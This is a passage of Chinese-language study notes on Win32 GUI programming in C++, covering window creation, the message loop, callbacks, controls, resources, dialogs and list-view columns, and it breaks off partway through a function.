<h2 id="弹窗"><a href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBox</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HWND hWnd;				<span class="comment">//所有者窗口句柄（父级窗口） 无可填NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpText;			<span class="comment">//显示内容</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCaption,		<span class="comment">//标题</span></span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uType				<span class="comment">//风格（确认，取消一类的按键）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>选择不同的按键返回不同的值；</p>
<h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><ul>
<li>ascii码对应普通字符串 CHAR -&gt; char</li>
<li>utf系列对应宽字符串  WCHAR -&gt; wchar_t 输出是 %ls  用 L 修饰</li>
<li>通用字符串          TCHAR -&gt; 类型随环境变化，引用 tchar.h 头  用_T（）修饰；</li>
</ul>
<p>由此引申出了三个版本的操作函数；</p>
<p><strong>长度操作</strong>：</p>
<p>strlen wcslen _tcslen</p>
<p><strong>字符串转数字</strong>：</p>
<p>atoi strtol</p>
<p>_wtoi wcstol</p>
<p>_ttoi tcstol</p>
<p><strong>数字转字符串</strong>：</p>
<p>itoa _itow _itot</p>
<p>因为字符串，所以分三个版本：A W T；</p>
<p>如 MessageBoxA ，以及 MessageBoxW ，前者处理多字节，后者处理宽字节；</p>
<p>字节转换：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//宽字节转多字节  (用的时候直接用宏定义)</span></span><br><span class="line"><span class="built_in">WideCharToMultiByte</span>()</span><br><span class="line">---</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WCHAR_TO_CHAR(lpW_Char, lpChar) \</span></span><br><span class="line"><span class="meta">WideCharToMultiByte(CP_ACP, NULL, lpW_Char, -1, \</span></span><br><span class="line"><span class="meta">lpChar, sizeof(lpChar), NULL, FALSE)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//多字节转宽字节</span></span><br><span class="line"><span class="built_in">MultiByteToWideChar</span>()</span><br><span class="line">---</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHAR_TO_WCHAR(lpChar, lpWchar) \</span></span><br><span class="line"><span class="meta">MultiByteToWideChar(CP_ACP, NULL, lpChar, -1, \</span></span><br><span class="line"><span class="meta">lpWchar, sizeof(lpWchar))</span></span><br></pre></td></tr></table></figure>



<h2 id="创建窗口"><a href="#创建窗口" class="headerlink" title="创建窗口"></a>创建窗口</h2><p>先创建WinMain函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">//都用W版本</span></span><br><span class="line">	<span class="comment">//创建窗口类</span></span><br><span class="line">	WNDCLASSW wnd = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	wnd.lpszClassName = <span class="string">L&quot;Second_BC&quot;</span>;	<span class="comment">//类名唯一</span></span><br><span class="line">	wnd.lpfnWndProc = WindowProc;		<span class="comment">//窗口回调函数</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//注册窗口类</span></span><br><span class="line">	<span class="built_in">RegisterClassW</span>(&amp;wnd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建窗口</span></span><br><span class="line">	HWND window = <span class="built_in">CreateWindowW</span>(</span><br><span class="line">					wnd.lpszClassName,	<span class="comment">//类名</span></span><br><span class="line">					<span class="string">L&quot;1049&quot;</span>,			<span class="comment">//窗口名</span></span><br><span class="line">					WS_OVERLAPPEDWINDOW,<span class="comment">//风格</span></span><br><span class="line">					CW_USEDEFAULT,		<span class="comment">//x,y坐标，默认款式</span></span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					CW_USEDEFAULT,		<span class="comment">//长宽，默认款式</span></span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					<span class="literal">NULL</span>,				<span class="comment">//父窗口的句柄</span></span><br><span class="line">					<span class="literal">NULL</span>,				<span class="comment">//菜单</span></span><br><span class="line">					hInstance,			<span class="comment">//实例句柄</span></span><br><span class="line">					<span class="number">0</span>					<span class="comment">//传给回调函数参数</span></span><br><span class="line">				);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//显示窗口</span></span><br><span class="line">	<span class="built_in">ShowWindow</span>(</span><br><span class="line">		window,			<span class="comment">//窗口句柄</span></span><br><span class="line">		SW_NORMAL		<span class="comment">//默认显示方式</span></span><br><span class="line">	);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取消息</span></span><br><span class="line">	MSG msg = &#123; <span class="number">0</span> &#125;;	<span class="comment">//消息类</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">GetMessageW</span>(	<span class="comment">//不断获取消息		</span></span><br><span class="line">		&amp;msg,			<span class="comment">//消息类</span></span><br><span class="line">		<span class="number">0</span>,				<span class="comment">//窗口句柄 0默认全部窗口</span></span><br><span class="line">		<span class="number">0</span>,				<span class="comment">//消息类型默认</span></span><br><span class="line">		<span class="number">0</span></span><br><span class="line">	))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DispatchMessageW</span>(&amp;msg);	<span class="comment">//分发消息给处理函数</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>处理函数\回调：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HWND hwnd,			<span class="comment">//窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ UINT uMsg,			<span class="comment">//消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ WPARAM wParam,		<span class="comment">//参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (uMsg)			<span class="comment">//操作消息</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">		<span class="built_in">DestroyWindow</span>(hwnd);<span class="comment">//销毁窗口</span></span><br><span class="line">		<span class="built_in">PostQuitMessage</span>(<span class="number">0</span>); <span class="comment">//退出消息，终止循环</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);		<span class="comment">//默认窗口处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单说说回调函数机制：</p>
<p>每个窗口类会带有一个回调函数，用于处理这个类创建的窗口所获取的信息；</p>
<p>在无限循环的信息捕获中，当收到信息后（晃动鼠标，点击，按键），则使得 <code>DispatchMessageW(&amp;msg);</code> 激活，调用指定窗口回调函数；</p>
<p>在这里指定窗口是 0 ，则是所有窗口；</p>
<p>回调函数中，为了当 <strong>点击叉掉</strong> 窗口时就 <strong>结束程序</strong> 就应该设置 退出信息 ： <code>WM_CLOSE</code> 摧毁窗口，并退出 postmessage，此时就会退出在主函数里的循环；</p>
<p>回调函数的参数，第二个是信息，第三第四个是一些参数，这些参数有一定的作用，可以知道实际的状态：键盘按下但无弹起 / 鼠标处于窗口位置，等等；</p>
<h2 id="消息处理"><a href="#消息处理" class="headerlink" title="消息处理"></a>消息处理</h2><p>定义在 WINUSER.H 中， 以 WM_开头 （windows message）；</p>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ol>
<li><p>窗口消息，如之前遇到的 <code>WM_CLOSE</code> ；</p>
</li>
<li><p>命令消息，特指 <code>WM_COMMAND</code> ，点击菜单，控件等会产生；</p>
<table>
<thead>
<tr>
<th>WM_COMMAND</th>
<th>LOW WPARAM</th>
<th>HIGH WPARAM</th>
<th>LPARAM</th>
</tr>
</thead>
<tbody><tr>
<td>标准控件</td>
<td>id</td>
<td>响应码</td>
<td>控件句柄</td>
</tr>
<tr>
<td>快捷键</td>
<td>id</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>菜单</td>
<td>id</td>
<td>0</td>
<td>0</td>
</tr>
</tbody></table>
</li>
<li><p>通知消息，特指 <code>WM_NOTIFY</code> ，只使用 用 windows 的公共控件，如列表，视图；</p>
<table>
<thead>
<tr>
<th>WM_NOTIFY</th>
<th>WPARAM</th>
<th>LPARAM</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>id</td>
<td>NMHDR指针</td>
</tr>
</tbody></table>
<p>NMHDR -&gt; notify message header</p>
</li>
</ol>
<p>控件消息，如：</p>
<p>BM_    按钮</p>
<p>EM_    编辑框</p>
<p>STM_    静态文本</p>
<p>CM_    组合框</p>
<p>LBM_    列表</p>
<p>以及用户自定义消息，消息号大于 <code>WM_USER</code> ;</p>
<h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><p>PostMessage， SendMessage；</p>
<p>前者放到消息队列，后者主动调用 指定的回调函数；</p>
<h3 id="变参函数"><a href="#变参函数" class="headerlink" title="变参函数"></a>变参函数</h3><p>用于如printf输出宽字节；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(LPCWSTR format, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR wchar_buff[<span class="number">100</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">    va_list arglist;	<span class="comment">//本质char类型，用于存放后面的参数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">va_start</span>(arglist, format);	<span class="comment">//第二个参数是指针起始+1，也就是后面的参数</span></span><br><span class="line">    <span class="built_in">wvsprintfW</span>(wchar_buff, format, arglist);</span><br><span class="line">    <span class="built_in">va_end</span>(arglist);	<span class="comment">//结束</span></span><br><span class="line">    <span class="built_in">wprintf</span>(format, wchar_buff);	<span class="comment">//输出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="窗口控件"><a href="#窗口控件" class="headerlink" title="窗口控件"></a>窗口控件</h2><p>使用控件引头文件： <code>&lt;CommCtrl.h&gt;</code></p>
<p>窗口风格分两类：</p>
<p>窗口关系:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WS_OVERLAPED	重叠</span><br><span class="line">WS_POPUP		弹窗</span><br><span class="line">WS_CHILD		子窗口</span><br></pre></td></tr></table></figure>

<p>窗口外观：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WS_BORDER</span><br><span class="line">WS_CAPITON</span><br></pre></td></tr></table></figure>

<p>它们之间可以用 | 运算结合使用；</p>
<p>控件的本质，还是窗口，在父窗口创建开始添加即可；</p>
<p>标准控件：</p>
<table>
<thead>
<tr>
<th align="left">类名</th>
<th>名称</th>
</tr>
</thead>
<tbody><tr>
<td align="left">WC_BUTTON</td>
<td>按钮</td>
</tr>
<tr>
<td align="left">WC_STATIC</td>
<td>静态文本</td>
</tr>
<tr>
<td align="left">WC_COMBOBOX</td>
<td>复合框</td>
</tr>
<tr>
<td align="left">WC_EDIT</td>
<td>编辑框</td>
</tr>
<tr>
<td align="left">WC_LISTBOX</td>
<td>列表框</td>
</tr>
<tr>
<td align="left">WC_SCROLLBAR</td>
<td>滚动条</td>
</tr>
</tbody></table>
<p>通用控件，如：</p>
<p>WC_LISTVIEW    列表框控件</p>
<p>WC_TREEVIEW    树控件</p>
<p>WC_TABCONTROL  Tab控件</p>
<p>…</p>
<p>子控件响应父窗口，使用 命令消息 和 通知消息，标准控件使用前者，通用控件使用后者；</p>
<p>修改之后的回调函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HWND hwnd,			<span class="comment">//窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ UINT uMsg,			<span class="comment">//消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ WPARAM wParam,		<span class="comment">//参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> HINSTANCE hInstance = <span class="built_in">GetModuleHandleW</span>(<span class="literal">NULL</span>);	<span class="comment">//NULL默认获取当前程序实例句柄</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (uMsg)			<span class="comment">//操作消息</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line">		<span class="comment">//创建窗口时创建子控件，menu栏是控件ID，存于wParam低位，lParam存控件句柄</span></span><br><span class="line">		<span class="built_in">CreateWindowW</span>(WC_BUTTON, <span class="string">L&quot;Button&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">30</span>, hwnd, (HMENU)<span class="number">0x100</span>, hInstance, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">		<span class="built_in">DestroyWindow</span>(hwnd);<span class="comment">//销毁窗口</span></span><br><span class="line">		<span class="built_in">PostQuitMessage</span>(<span class="number">1</span>); <span class="comment">//退出消息</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//激活控件，获取控件ID，执行相应操作</span></span><br><span class="line">		WORD controlId = <span class="built_in">LOWORD</span>(wParam);</span><br><span class="line">		<span class="built_in"><span class="keyword">switch</span></span> (controlId)</span><br><span class="line">		&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x100</span>:</span><br><span class="line">			<span class="built_in">MessageBoxW</span>(hwnd, <span class="string">L&quot;Click&quot;</span>, <span class="string">L&quot;Button&quot;</span>, MB_OK);</span><br><span class="line">           	<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上可以实现一个按钮弹窗功能；</p>
<h3 id="窗口操作函数"><a href="#窗口操作函数" class="headerlink" title="窗口操作函数"></a>窗口操作函数</h3><p>背景刷</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wnd.hbrBackground = <span class="built_in">CreateSolidBrush</span>(<span class="built_in">RGB</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));		<span class="comment">//白色背景</span></span><br></pre></td></tr></table></figure>



<p>移动窗口位置</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RECT rect&#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetClientRect</span>(hwnd, &amp;rect);					<span class="comment">//获取窗口工作区范围，返回给rect结构体</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x = <span class="built_in">rand</span>() % (rect.right - weight);				<span class="comment">//x,y坐标在工作范围内随机取</span></span><br><span class="line"><span class="keyword">int</span> y = <span class="built_in">rand</span>() % (rect.bottom - height);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MoveWindow</span>((HWND)lParam, x, y, weight, height, TRUE);	<span class="comment">//移动窗口函数</span></span><br></pre></td></tr></table></figure>



<p>获取和设置文本框内容</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HWND hedit = <span class="built_in">GetDlgItem</span>(hwnd, <span class="number">0x102</span>);		<span class="comment">//获取文本框句柄，第一个是父窗口句柄，第二个是id</span></span><br><span class="line">WCHAR buffer[max]&#123; <span class="number">0</span> &#125;;						<span class="comment">//缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">GetWindowTextW</span>(hedit, buffer, max);			<span class="comment">//用按钮实现		</span></span><br><span class="line"><span class="built_in">SetWindowTextW</span>(hedit, <span class="string">L&quot;123&quot;</span>);</span><br><span class="line">---</span><br><span class="line"><span class="comment">//实际上，对于Dlg的操作可以简化，下面等价于获取hedit之后写文本框</span></span><br><span class="line"><span class="built_in">SetDlgItemTextW</span>(hwnd, <span class="number">0x102</span>, <span class="string">L&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);						<span class="comment">//放到message循环里，接收键盘信息编辑文本框</span></span><br></pre></td></tr></table></figure>



<p>根据窗口名获取句柄</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HWND hwnd = <span class="built_in">FindWindowW</span>(ClassName, Name);		<span class="comment">//第一个窗口类名，第二个窗口名，不知道可以填0</span></span><br></pre></td></tr></table></figure>



<p>设置父窗口</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetParent</span>((HWND)lParam, hwnd);			<span class="comment">//第一个是要被设置的，第二个是新的父窗口</span></span><br></pre></td></tr></table></figure>



<h2 id="资源操作"><a href="#资源操作" class="headerlink" title="资源操作"></a>资源操作</h2><p>资源就是icon，光标，菜单一类的东西;</p>
<p>在VS里，代码下方可以创建资源，资源创建后，有资源本身，有.rc文件，以及resource.h头文件；</p>
<p>.rc保存了资源本身在文件中的宏命名，一般是int型，而头文件则是声明；</p>
<p>引入头后，使用 <code>LoadXXX</code> 函数获取资源句柄（XXX为资源类型，如图标是Icon）；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">LoadCursor</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_CURSOR1))</span><br></pre></td></tr></table></figure>

<p>参数类型第一个为实例句柄，第二个为资源宏，本质上是个指针，所以要强转，微软自带强转宏函数 <code>MAKEINTRESOURCE()</code> ；</p>
<p>使用如下代码设置类成员：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三个参数，第一个为窗口句柄，第二个为GCL_开头宏对应成员如GCL_ICON，第三个为设置的句柄，记得强转long</span></span><br><span class="line"><span class="built_in">SetClassLong</span>(hwnd, GCL_ICON, (<span class="keyword">long</span>)handle);		</span><br></pre></td></tr></table></figure>



<p>菜单可以加载后给CreateWindow函数；</p>
<p>子菜单响应也是 WM_COMMAND；</p>
<p>使用以下函数获取子菜单以及弹出菜单：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetSubMenu</span>(hMenu, <span class="number">0</span>); 		<span class="comment">//第一个父菜单，第二个相对于父菜单位置</span></span><br><span class="line"><span class="built_in">TrackPopupMenu</span>(hMenu, TPM_RIGHTALICGN, x, y, <span class="number">0</span>, hWnd, <span class="literal">NULL</span>);	<span class="comment">//第二个为对齐方式</span></span><br></pre></td></tr></table></figure>

<p>转换坐标当前窗口</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POINT point &#123; <span class="number">0</span> &#125;;</span><br><span class="line">point.x = x;</span><br><span class="line">point.y = y;</span><br><span class="line"><span class="built_in">ClientToScreen</span>(hwnd, &amp;point);</span><br></pre></td></tr></table></figure>



<h3 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h3><p>模态的会阻塞主窗口（无法点击主窗口），非模态不会；</p>
<p>创建非模态：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateDialogW</span>(		</span><br><span class="line">    hInstance,</span><br><span class="line">    dialogName,		<span class="comment">//ID</span></span><br><span class="line">    <span class="literal">NULL</span>,			<span class="comment">//父窗口句柄</span></span><br><span class="line">    Dlgproc			<span class="comment">//回调函数</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">Dlgproc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HWND hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uMsg,</span></span></span><br><span class="line"><span class="params"><span class="function">    WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_INITDIALOG:		<span class="comment">//初始化</span></span><br><span class="line">    	&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line">            <span class="built_in">QuitPostMessage</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    	<span class="keyword">return</span> FALSE;	<span class="comment">//没能处理返回无</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    	<span class="keyword">return</span> TRUE;	<span class="comment">//处理返回真</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建模态：</p>
<p>它不需要捕获信息，也不需要显示</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DialogBoxW</span>( <span class="comment">/* same */</span>)</span><br><span class="line"><span class="comment">//结束</span></span><br><span class="line"><span class="built_in">EndDialog</span>(hWnd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<p>介绍一些简单的控件：</p>
<p>windowsx.h 头有定义操作控件信息的宏，可读性更高；</p>
<p>复选框，单选框，属于按钮类，其信息为 BM_打头；</p>
<p>图片，其信息 STM_打头；</p>
<p>滑块和进度条，其信息 TBM_ PBM_ 打头；</p>
<h2 id="列表控件"><a href="#列表控件" class="headerlink" title="列表控件"></a>列表控件</h2><p>任务管理器就是一个列表；</p>
<p>其重要的信息是 ： <code>LVM_INSERTCOLUMN</code> ，插入索引；</p>
<p>其会用到一个结构：LVCOLUMN，其中标识了列表信息；</p>
<p>mask是掩码，说明了之后的成员有效性；</p>
<p>fmt是对齐方式，cx是大小，pszText为名字；</p>
<p>插入行： <code>LVM_INSERTITEM</code> ；</p>
<p>设置行： <code>LVM_SETITEMTEXT</code> ；</p>
<p>其结构和上面类似，叫 LVITEM；</p>
<p>item是第几行，subitem是第几列；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InsertColum</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> nColum, <span class="keyword">int</span> cx, LPWSTR name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LVCOLUMNW lvColumn = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	lvColumn.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">	lvColumn.fmt = LVCFMT_CENTER;</span><br><span class="line">	lvColumn.cx = cx;</span><br><span class="line">	lvColumn.pszText = name;</span><br><span class="line">	<span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_INSERTCOLUMNW, nColum, (LPARAM) &amp; lvColumn);</span><br><span class="line">	<span class="keyword">return</span> 